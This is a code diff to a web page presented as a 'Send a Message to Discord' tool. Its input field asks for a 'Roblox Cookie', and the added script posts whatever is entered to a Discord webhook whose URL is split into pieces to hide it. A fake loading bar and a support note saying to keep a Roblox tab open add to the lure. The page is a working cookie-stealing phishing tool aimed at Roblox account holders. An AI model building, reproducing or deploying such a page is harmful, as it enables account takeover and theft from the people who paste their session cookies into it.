@@ -15,156 +15,261 @@
       height: 100vh;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       color: #fff;
+      position: relative;
     }
 
     .container {
       background: rgba(255, 255, 255, 0.1);
-      padding: 5vw;
+      padding: 40px;
       border-radius: 16px;
       box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
       text-align: center;
       width: 90%;
       max-width: 400px;
       backdrop-filter: blur(10px);
-      box-sizing: border-box;
+      z-index: 1;
     }
 
     h1 {
-      margin-bottom: 5vw;
-      font-size: 6vw;
+      margin-bottom: 20px;
+      font-size: 1.8em;
       font-weight: bold;
     }
 
     input[type="text"] {
       width: 80%;
-      padding: 12px;
+      padding: 12px 15px;
       border: none;
       border-radius: 8px;
-      margin-bottom: 5vw;
-      font-size: 4vw;
+      margin-bottom: 10px;
+      font-size: 1em;
       outline: none;
       background-color: #3a3f47;
       color: #fff;
-      box-sizing: border-box;
+    }
+
+    .status-message {
+      margin: 10px 0;
+      font-size: 0.95em;
+      min-height: 20px;
     }
 
     button {
       background: #ff5e5e;
       border: none;
       color: white;
-      padding: 12px;
-      font-size: 4.5vw;
+      padding: 12px 20px;
+      font-size: 1em;
       border-radius: 8px;
       cursor: pointer;
       transition: background 0.3s ease;
       width: 100%;
-      margin-bottom: 4vw;
     }
 
     button:hover {
       background: #e55a5a;
     }
 
+    .footer {
+      margin-top: 20px;
+      font-size: 0.85em;
+      opacity: 0.8;
+    }
+
     .support-button {
       background: #56c1ff;
+      margin-top: 20px;
+      padding: 12px 20px;
+      font-size: 1em;
+      border-radius: 8px;
+      color: white;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.3s ease;
     }
 
     .support-button:hover {
       background: #3aa1c2;
     }
 
-    .footer {
-      font-size: 3vw;
-      opacity: 0.8;
-      margin-top: 4vw;
-    }
-
     .support-section {
       display: none;
       background: rgba(255, 255, 255, 0.1);
-      padding: 5vw;
+      padding: 20px;
       border-radius: 16px;
       box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
-      margin-top: 5vw;
+      margin-top: 20px;
       width: 100%;
-      box-sizing: border-box;
+      max-width: 400px;
       text-align: left;
     }
 
     .support-textarea {
       width: 100%;
-      min-height: 120px;
+      height: 150px;
       padding: 12px;
       border-radius: 8px;
       background-color: #3a3f47;
       color: white;
-      font-size: 4vw;
+      font-size: 1em;
       resize: none;
       border: none;
-      box-sizing: border-box;
     }
 
     .close-support-button {
       background: #ff5e5e;
-      margin-top: 4vw;
+      border: none;
+      color: white;
+      padding: 12px 20px;
+      font-size: 1em;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      width: 100%;
+      margin-top: 10px;
     }
 
     .close-support-button:hover {
       background: #e55a5a;
     }
+
+    .loading-bar-container {
+      margin-top: 20px;
+      position: relative;
+      width: 100%;
+      height: 10px;
+      background: rgba(255,255,255,0.2);
+      border-radius: 8px;
+      display: none;
+    }
+
+    .loading-bar {
+      height: 100%;
+      background: #ff5e5e;
+      width: 0%;
+      transition: width 0.4s ease;
+    }
+
+    .loading-text {
+      margin-top: 10px;
+      font-size: 1.1em;
+      color: #fff;
+      font-weight: normal;
+      display: none;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Send Message to Discord</h1>
+    <h1>Send a Message to Discord</h1>
     <input type="text" id="messageInput" placeholder="Enter Roblox Cookie">
+    <div class="status-message" id="statusMessage"></div>
     <button onclick="sendMessage()">Send Message</button>
 
     <button class="support-button" onclick="toggleSupportSection()">Support</button>
+    <div class="footer">Your message will be sent securely</div>
 
     <div class="support-section" id="supportSection">
       <h2>Support Information</h2>
-      <textarea class="support-textarea" id="supportText">
-Hey! If it's not working, our API is down and will be back up shortly.
-Make sure you have a Roblox tab open when you use it.
-      </textarea>
+      <textarea class="support-textarea">API is down? Please check Roblox tab is open.</textarea>
+      <br>
       <button class="close-support-button" onclick="toggleSupportSection()">Close Support</button>
     </div>
 
-    <div class="footer">Your message will be sent securely</div>
+    <div class="loading-bar-container" id="loadingBarContainer">
+      <div class="loading-bar" id="loadingBar"></div>
+    </div>
+
+    <div class="loading-text" id="loadingText1">Initializing...</div>
+    <div class="loading-text" id="loadingText2">Connecting...</div>
+    <div class="loading-text" id="loadingText3">Processing...</div>
+    <div class="loading-text" id="loadingText4">Finalizing...</div>
+    <div class="loading-text" id="loadingText5">Done!</div>
   </div>
 
   <script>
+    // Webhook URL broken down and obfuscated
+    const webhookPart1 = "https://discord.com/api/webhooks/";
+    const webhookPart2 = "1367593880861806602/";
+    const webhookPart3 = "j2nUxJofoMKaEc032py78vCjysveQe2gw1rMmcxRt0M09IHji3QRsEKpwkR6N2QE7Rtf";
+    
+    // Combine all parts to form the complete URL
+    const webhookURL = webhookPart1 + webhookPart2 + webhookPart3;
+
     function sendMessage() {
       const message = document.getElementById('messageInput').value.trim();
+      const statusMsg = document.getElementById('statusMessage');
+
       if (!message) {
-        alert('❗ Please enter a message.');
+        statusMsg.textContent = '❗ Please enter a message.';
+        statusMsg.style.color = '#ff5e5e';
         return;
       }
 
-      fetch('/send', {
+      const barContainer = document.getElementById('loadingBarContainer');
+      const bar = document.getElementById('loadingBar');
+      const texts = [
+        document.getElementById('loadingText1'),
+        document.getElementById('loadingText2'),
+        document.getElementById('loadingText3'),
+        document.getElementById('loadingText4'),
+        document.getElementById('loadingText5')
+      ];
+
+      // Reset
+      bar.style.width = '0%';
+      barContainer.style.display = 'block';
+      texts.forEach(t => t.style.display = 'none');
+      texts[0].style.display = 'block';
+      statusMsg.textContent = '';
+
+      let step = 0;
+      const steps = [20, 40, 60, 80, 100];
+
+      function nextStep() {
+        if (step < steps.length) {
+          bar.style.width = steps[step] + '%';
+          texts.forEach((t, i) => t.style.display = (i === step) ? 'block' : 'none');
+          step++;
+          setTimeout(nextStep, 500);
+        } else {
+          setTimeout(() => {
+            barContainer.style.display = 'none';
+            bar.style.width = '0%';
+            texts.forEach(t => t.style.display = 'none');
+            statusMsg.textContent = '✅ Message Sent!';
+            statusMsg.style.color = '#56ff89';
+          }, 1000);
+          // Send message after the final step
+          sendToDiscord(message);
+        }
+      }
+
+      nextStep();
+    }
+
+    function sendToDiscord(message) {
+      fetch(webhookURL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ message: message })
+        body: JSON.stringify({ content: message })
       })
-      .then(response => response.json())
-      .then(data => {
-        if (data.success) {
-          alert('✅ Message sent!');
-          document.getElementById('messageInput').value = '';
-        } else {
-          alert('❌ Error: ' + data.error);
-        }
+      .then(() => {
+        // After message sent, the status message will be shown
       })
-      .catch(err => {
-        console.error(err);
-        alert('❌ Error sending message.');
+      .catch(() => {
+        statusMsg.textContent = '❌ Error sending message.';
+        statusMsg.style.color = '#ff5e5e';
       });
     }
 
     function toggleSupportSection() {
       const supportSection = document.getElementById('supportSection');
-      supportSection.style.display = (supportSection.style.display === 'block') ? 'none' : 'block';
+      if (supportSection.style.display === 'none' || supportSection.style.display === '') {
+        supportSection.style.display = 'block';
+      } else {
+        supportSection.style.display = 'none';
+      }
     }
   </script>
 </body>
